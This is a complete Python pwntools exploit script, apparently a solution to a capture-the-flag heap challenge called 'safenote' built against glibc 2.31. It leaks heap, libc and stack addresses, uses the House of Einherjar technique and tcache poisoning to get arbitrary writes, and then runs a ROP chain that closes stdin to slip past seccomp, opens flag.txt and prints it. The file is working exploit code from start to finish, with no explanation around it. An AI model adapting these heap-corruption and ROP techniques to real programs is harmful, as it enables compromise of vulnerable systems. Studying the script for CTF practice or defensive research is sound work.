#!/usr/bin/env python3

from pwn import *

elf = ELF("./safenote_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    global r
    if args.REMOTE:
        r = remote()
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b *main+860
                                b *main+610
                                b *main+743

                                ignore 1 18
                                ignore 2 12
                                ignore 3 3
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r

def alloc(size: int, idx: int):
    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Index of the note (0-15): ', str(idx).encode())
    r.sendlineafter(b'Enter the size of the note (max 0x2f8): ', str(size).encode())

def free(idx: int):
    r.sendlineafter(b'Your choice: ', b'4')
    r.sendlineafter(b'Index of the note (0-15): ', str(idx).encode())

def read(idx: int, limit: int | None = None) -> bytes:
    r.sendlineafter(b'Your choice: ', b'2')
    r.sendlineafter(b'Index of the note (0-15): ', str(idx).encode())
    r.recvuntil(b'Data: ')
    if limit is not None:
        return r.recv(limit)
    else:
        return r.recvline().strip()

def edit(idx: int, data: bytes):
    r.sendlineafter(b'Your choice: ', b'3')
    r.sendlineafter(b'Index of the note (0-15): ', str(idx).encode())
    r.sendafter(b'Data: ', data)

def main():
    r = conn()

    # leak heap
    alloc(0x20, 0)
    heap_base = u64(read(0).ljust(8, b'\x00')) - 0x460
    log.success(f"Heap base: {hex(heap_base)}")

    # fill tcache for size 0x200 and add 3 more chunks to be put into the unsorted bin
    SIZE = 0x200-8
    for i in range(10): # one more to prevent consolidation with top chunk
        alloc(SIZE, i)
    for i in range(7):
        free(i)

    # house of einherjar https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_einherjar.c
    payload = flat([
        heap_base + 0x3fa0,
        0x1f1,  # fake size
        heap_base + 0x3fa0 - 0x18,  # fw
        heap_base + 0x3fa0 - 0x10,  # bl
    ]).ljust(SIZE-0x8, b'a') + p64(0x1f0)

    edit(7, payload) # overwrite PREV_INUSE flag of next chunk and fill PREV_SIZE with a correct size
    free(8) # this consolidates to the previous chunk. chunks[7] now holds a valid pointer to our fake free'd chunk

    # leak libc
    alloc(0x2f0, 8) # this points to the fake chunk
    libc.address = u64(read(8).ljust(8, b'\x00')) - 0x1ecfc0
    log.success(f"libc base: {hex(libc.address)}")

    # Put 8 and 9 in tcache so 8 has a fw ptr
    alloc(0x2f0, 9)
    free(9)
    free(8)

    # leak stack by reading environ@GLIBC
    payload = flat([
        0x0,
        0x301,
        libc.sym.environ,
        0x0
    ])

    # use our live reference to edit the fw
    edit(7, payload)
    alloc(0x2f0, 8)
    alloc(0x2f0, 9) # this will be allocated at environ@GLIBC

    stack_leak = u64(read(9).ljust(8, b'\x00'))
    log.success(f"Stack leak: {hex(stack_leak)}")

    # Put 8 and 9 in tcache so 8 has a fw ptr
    alloc(0x2f0, 9)
    free(9)
    free(8)

    payload = flat([
        0x0,
        0x301,
        stack_leak - 0x170, # this points to read's return address
        0x0
    ]) + b"flag.txt" # the string will be at heap_base + 0x3fa0 + 0x20

    # use our live reference to edit the fw
    edit(7, payload)
    alloc(0x2f0, 8)
    alloc(0x2f0, 9) # this wll point to the read's return address in the stack

    POP_RDI         = libc.address + 0x23b6a    # pop rdi; ret;
    POP_RSI         = libc.address + 0x2601f    # pop rsi; ret;
    POP_RAX         = libc.address + 0x36174    # pop rax; ret; 
    SYSCALL         = libc.address + 0x630a9    # syscall; ret; 

    payload = flat([
        # close stdin to bypass seccomps
        POP_RDI,
        0x0,
        libc.sym.close,

        # open "flag.txt" to fd 0
        POP_RDI,
        heap_base + 0x3fa0 + 0x20, # &"flag.txt"
        POP_RSI,
        0x0,
        POP_RAX,
        0x2,
        SYSCALL,

        # read from fd 0 to heap
        POP_RDI,
        0x0,
        POP_RSI,
        heap_base + 0x3fa0 + 0x30,
        libc.sym.read,

        # write to stdout
        POP_RDI,
        0x1,
        libc.sym.write,

        # exit
        POP_RDI,
        0x0,
        libc.sym.exit
    ])

    edit(9, payload) # ROP 2 the win

    r.interactive()


if __name__ == "__main__":
    main()
